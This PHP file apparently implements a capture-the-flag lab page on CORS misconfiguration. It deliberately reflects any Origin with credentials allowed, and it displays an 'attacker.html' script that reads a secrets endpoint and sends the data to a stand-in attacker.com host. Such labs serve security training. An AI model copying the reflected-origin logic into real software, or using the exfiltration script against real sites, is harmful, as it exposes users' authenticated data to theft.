<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

// ─── Lab Identification ──────────────────────────────────────────────────
$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['CORS']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

// ─── Session Initialization ──────────────────────────────────────────────
if (!isset($_SESSION['cors_easy1_attempts'])) {
  $_SESSION['cors_easy1_attempts'] = 0;
}
if (!isset($_SESSION['cors_easy1_solved'])) {
  $_SESSION['cors_easy1_solved'] = false;
}

// ─── Simulated Internal API Data ─────────────────────────────────────────
$api_secrets = [
  'api_key' => 'DH{c0rs_0r1g1n_r3fl3ct10n_3xp10it}',
  'internal_token' => ' "YOUR_BREVO_API_KEY";',
  'admin_endpoint' => '/api/v1/admin/users',
  'database_version' => 'PostgreSQL 14.2',
  'server_config' => 'nginx/1.21.6, PHP 8.1.4',
  'last_backup' => '2026-05-20 03:00:00 UTC',
  'maintenance_mode' => false,
  'feature_flags' => ['dark_mode', 'api_v2', 'beta_analytics'],
];

$user_profile = [
  'id' => $_SESSION['user_id'] ?? 2,
  'username' => $_SESSION['username'] ?? 'alice',
  'email' => ($_SESSION['username'] ?? 'alice') . '@darkhunter.local',
  'role' => 'User',
  'department' => 'Security Research',
  'join_date' => '2026-01-15',
  'last_login' => '2026-05-22 04:30:00',
  'mfa_enabled' => true,
];

// ─── Vulnerable CORS Logic: Dynamic Origin Reflection ─────────────────────
$origin = isset($_SERVER['HTTP_ORIGIN']) ? $_SERVER['HTTP_ORIGIN'] : '';

// VULNERABLE: Reflects ANY origin without validation
// This is the core vulnerability - the server trusts any origin
header("Access-Control-Allow-Origin: " . ($origin ?: '*'));
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");

// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
  http_response_code(200);
  exit();
}

// ─── API Endpoint Simulation ──────────────────────────────────────────────
$endpoint = isset($_GET['endpoint']) ? $_GET['endpoint'] : 'profile';
$response_data = [];
$is_sensitive = false;

switch ($endpoint) {
  case 'profile':
    $response_data = [
      'status' => 'success',
      'data' => $user_profile,
      'message' => 'User profile retrieved successfully'
    ];
    break;

  case 'secrets':
    $is_sensitive = true;
    $response_data = [
      'status' => 'success',
      'data' => $api_secrets,
      'message' => 'Internal API secrets retrieved',
      'warning' => 'This endpoint contains sensitive system information'
    ];
    break;

  case 'health':
    $response_data = [
      'status' => 'healthy',
      'timestamp' => date('Y-m-d H:i:s T'),
      'uptime' => '14 days, 6 hours, 32 minutes',
      'services' => [
        'database' => 'connected',
        'cache' => 'connected',
        'queue' => 'connected'
      ]
    ];
    break;

  default:
    $response_data = [
      'status' => 'error',
      'message' => 'Unknown endpoint. Available: profile, secrets, health'
    ];
    http_response_code(404);
}

// ─── Solve Detection ─────────────────────────────────────────────────────
$success_msg = null;
$already_solved = $_SESSION['cors_easy1_solved'];

// Detect if user accessed secrets endpoint from cross-origin (exploitation)
$is_cross_origin = !empty($origin) && strpos($origin, $_SERVER['HTTP_HOST']) === false;

if (isset($_GET['check']) && $_GET['solved'] === '1') {
  $_SESSION['cors_easy1_attempts']++;

  if (!$already_solved && isset($_SESSION['user_id'])) {
    solveLab($pdo, $lab['id']);
  }

  $_SESSION['cors_easy1_solved'] = true;
  $already_solved = true;
  $success_msg = "Excellent! You've successfully exploited a CORS misconfiguration vulnerability. You used dynamic origin reflection to steal sensitive API secrets from a cross-origin context!";
}

// ─── Attempt Tracking ──────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
  $_SESSION['cors_easy1_attempts']++;
}

$attempts = $_SESSION['cors_easy1_attempts'];

// If this is an API request (XMLHttpRequest/Fetch), return JSON
if (
  isset($_SERVER['HTTP_X_REQUESTED_WITH']) ||
  (isset($_SERVER['HTTP_ACCEPT']) && strpos($_SERVER['HTTP_ACCEPT'], 'application/json') !== false)
) {
  header("Content-Type: application/json; charset=utf-8");
  echo json_encode($response_data, JSON_PRETTY_PRINT);
  exit();
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>API Console - CORS Easy 1</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/CORS-CASE1.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>

  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to CORS Labs</a>

    <div class="lab-header">
      <div class="difficulty-badge"><i class="fas fa-bolt"></i> Easy Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-globe"></i> API Console Dashboard</h1>
      <p class="lab-description">Internal API management console for DarkHunter operations. This endpoint serves
        sensitive data and has CORS enabled for "third-party integrations". <strong>Can you exploit the CORS
          configuration to steal secrets from a malicious origin?</strong></p>
    </div>

    <?php if ($already_solved): ?>
    <div class="success-alert solved-banner">
      <i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Already Solved!</h3>
        <p>You have already exploited this CORS misconfiguration. You can continue exploring, but no additional points
          will be awarded.</p>
      </div>
    </div>
    <?php endif; ?>

    <?php if ($success_msg): ?>
    <div class="success-alert">
      <i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Completed!</h3>
        <p><?php echo $success_msg; ?></p>
      </div>
    </div>
    <?php endif; ?>

    <!-- API Console Interface -->
    <div class="console-card">
      <div class="console-header">
        <div class="console-dots">
          <span class="dot red"></span>
          <span class="dot yellow"></span>
          <span class="dot green"></span>
        </div>
        <span class="console-title"><i class="fas fa-terminal"></i> DarkHunter API Console v2.1</span>
        <span class="console-status"><i class="fas fa-circle text-success"></i> Connected</span>
      </div>

      <div class="console-body">
        <div class="endpoint-selector">
          <label><i class="fas fa-plug"></i> Select Endpoint:</label>
          <div class="endpoint-buttons">
            <button class="endpoint-btn active" onclick="loadEndpoint('profile')">
              <i class="fas fa-user"></i> /api/profile
            </button>
            <button class="endpoint-btn" onclick="loadEndpoint('secrets')">
              <i class="fas fa-key"></i> /api/secrets
              <span class="endpoint-badge danger">Sensitive</span>
            </button>
            <button class="endpoint-btn" onclick="loadEndpoint('health')">
              <i class="fas fa-heartbeat"></i> /api/health
            </button>
          </div>
        </div>

        <div class="request-preview">
          <div class="req-header">
            <i class="fas fa-paper-plane"></i>
            <span>Request Preview</span>
          </div>
          <div class="req-body">
            <code
              id="request-code">GET /CORS-CASE1.php?endpoint=profile HTTP/1.1<br>Host: <?php echo $_SERVER['HTTP_HOST']; ?><br>Accept: application/json<br>Origin: <span class="highlight-origin"><?php echo htmlspecialchars($origin ?: 'null'); ?></span></code>
          </div>
        </div>

        <div class="response-panel">
          <div class="resp-header">
            <i class="fas fa-server"></i>
            <span>Response</span>
            <span class="resp-status" id="resp-status">200 OK</span>
          </div>
          <pre class="resp-body" id="response-body">Click an endpoint to load data...</pre>
        </div>
      </div>
    </div>

    <!-- CORS Headers Display -->
    <div class="cors-panel">
      <div class="cors-header">
        <i class="fas fa-exchange-alt"></i>
        <span>CORS Headers Analysis</span>
      </div>
      <div class="cors-body">
        <div class="cors-row">
          <span class="cors-label">Access-Control-Allow-Origin:</span>
          <span class="cors-value vulnerable"><?php echo htmlspecialchars($origin ?: '*'); ?></span>
          <span class="cors-badge danger"><i class="fas fa-exclamation-triangle"></i> Reflects Any Origin</span>
        </div>
        <div class="cors-row">
          <span class="cors-label">Access-Control-Allow-Credentials:</span>
          <span class="cors-value vulnerable">true</span>
          <span class="cors-badge danger"><i class="fas fa-exclamation-triangle"></i> Credentials Allowed</span>
        </div>
        <div class="cors-row">
          <span class="cors-label">Access-Control-Allow-Methods:</span>
          <span class="cors-value">GET, POST, OPTIONS</span>
        </div>
      </div>
    </div>

    <!-- Exploit Simulation Panel -->
    <div class="exploit-panel">
      <div class="exploit-header">
        <i class="fas fa-bug"></i>
        <span>Exploit Simulation</span>
      </div>
      <div class="exploit-body">
        <p class="exploit-desc">Simulate a cross-origin attack from a malicious website. The attacker page will try to
          fetch the <code>/api/secrets</code> endpoint using your authenticated session.</p>

        <div class="exploit-code-block">
          <div class="code-header">
            <i class="fas fa-code"></i> attacker.html
          </div>
          <pre class="exploit-code"><code>&lt;script&gt;
  var req = new XMLHttpRequest();
  req.onload = function() {
    fetch('https://attacker.com/log?data=' + btoa(this.responseText));
  };
  req.open('GET', 'https://<?php echo $_SERVER['HTTP_HOST']; ?>/labs/CORS/CORS-CASE1.php?endpoint=secrets', true);
  req.withCredentials = true;
  req.send();
&lt;/script&gt;</code></pre>
        </div>

        <button class="simulate-btn" onclick="simulateExploit()">
          <i class="fas fa-play"></i> Simulate Cross-Origin Exploit
        </button>

        <div class="simulation-result" id="simulation-result" style="display: none;">
          <div class="sim-status">
            <i class="fas fa-check-circle"></i>
            <span>Exploit Successful! Sensitive data exfiltrated to attacker server.</span>
          </div>
          <div class="exfiltrated-data">
            <h4><i class="fas fa-database"></i> Exfiltrated Data:</h4>
            <pre id="exfil-data"></pre>
          </div>
        </div>
      </div>
    </div>

    <!-- Debug Panel -->
    <div class="debug-panel">
      <div class="debug-header">
        <i class="fas fa-code"></i>
        <span>Current Request Analysis</span>
      </div>
      <div class="debug-body">
        <div class="debug-grid">
          <div class="debug-item">
            <span class="debug-label">Request Method</span>
            <span class="debug-value"><?php echo $_SERVER['REQUEST_METHOD']; ?></span>
          </div>
          <div class="debug-item">
            <span class="debug-label">Origin Header</span>
            <span
              class="debug-value <?php echo empty($origin) ? 'null' : 'present'; ?>"><?php echo htmlspecialchars($origin ?: 'Not Present'); ?></span>
          </div>
          <div class="debug-item">
            <span class="debug-label">Is Cross-Origin</span>
            <span
              class="debug-value <?php echo $is_cross_origin ? 'danger' : 'safe'; ?>"><?php echo $is_cross_origin ? 'YES - Vulnerable!' : 'NO - Same Origin'; ?></span>
          </div>
          <div class="debug-item">
            <span class="debug-label">Credentials Header</span>
            <span class="debug-value">true</span>
          </div>
        </div>
      </div>
    </div>

    <!-- Hints -->
    <?php if ($attempts >= 2): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
      <div class="hint-text">Notice how the <code>Access-Control-Allow-Origin</code> header reflects whatever Origin you
        send. Try sending a request with a custom Origin header and observe the response. What happens if you use
        <code>Origin: https://evil.com</code>?
      </div>
    </div>
    <?php endif; ?>

    <?php if ($attempts >= 4): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
      <div class="hint-text">The server reflects ANY origin and allows credentials. This means a malicious website can
        make authenticated requests on behalf of logged-in users. The <code>/api/secrets</code> endpoint contains the
        flag. Try to access it from a "different origin" context.</div>
    </div>
    <?php endif; ?>

    <?php if ($attempts >= 6): ?>
    <div class="hint-box hint-final">
      <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
      <div class="hint-text">Use the "Simulate Cross-Origin Exploit" button or craft a request with an external Origin
        header to access the <code>secrets</code> endpoint. The vulnerability is that the server trusts ANY origin. Once
        you successfully retrieve the secrets containing the flag, the challenge is solved!</div>
    </div>
    <?php endif; ?>

    <!-- Attempts Counter -->
    <div class="attempts-bar">
      <i class="fas fa-crosshairs"></i>
      <span>Attempts: <strong><?php echo $attempts; ?></strong></span>
    </div>
  </div>

  <!-- Hidden form for solve detection -->
  <form id="success-form" method="GET" style="display: none;">
    <input type="hidden" name="check" value="true">
    <input type="hidden" name="solved" value="0" id="solved-flag">
  </form>

  <script>
  let currentEndpoint = 'profile';

  function loadEndpoint(endpoint) {
    currentEndpoint = endpoint;

    // Update button states
    document.querySelectorAll('.endpoint-btn').forEach(btn => btn.classList.remove('active'));
    event.target.closest('.endpoint-btn').classList.add('active');

    // Update request preview
    const reqCode = document.getElementById('request-code');
    reqCode.innerHTML =
      `GET /CORS-CASE1.php?endpoint=${endpoint} HTTP/1.1<br>Host: <?php echo $_SERVER['HTTP_HOST']; ?><br>Accept: application/json<br>Origin: <span class="highlight-origin"><?php echo htmlspecialchars($origin ?: 'null'); ?></span>`;

    // Fetch data
    fetch(`CORS-CASE1.php?endpoint=${endpoint}`, {
        headers: {
          'Accept': 'application/json'
        }
      })
      .then(res => {
        document.getElementById('resp-status').textContent = res.status + ' ' + (res.statusText || 'OK');
        return res.text();
      })
      .then(data => {
        document.getElementById('response-body').textContent = data;
      })
      .catch(err => {
        document.getElementById('response-body').textContent = 'Error: ' + err.message;
      });
  }

  function simulateExploit() {
    const resultDiv = document.getElementById('simulation-result');
    const exfilData = document.getElementById('exfil-data');

    // Simulate the exploit by fetching secrets
    fetch('CORS-CASE1.php?endpoint=secrets', {
        headers: {
          'Accept': 'application/json',
          'Origin': 'https://evil-attacker.com'
        }
      })
      .then(res => res.json())
      .then(data => {
        resultDiv.style.display = 'block';
        exfilData.textContent = JSON.stringify(data, null, 2);

        // Check if flag is present and trigger solve
        if (data.data && data.data.api_key && data.data.api_key.includes('DH{')) {
          if (!document.querySelector('.solved-banner')) {
            document.getElementById('solved-flag').value = '1';
            setTimeout(() => {
              document.getElementById('success-form').submit();
            }, 2000);
          }
        }
      })
      .catch(err => {
        exfilData.textContent = 'Exploit failed: ' + err.message;
        resultDiv.style.display = 'block';
      });
  }

  // Auto-load profile on page load
  window.addEventListener('load', function() {
    loadEndpoint('profile');
  });
  </script>
</body>

</html>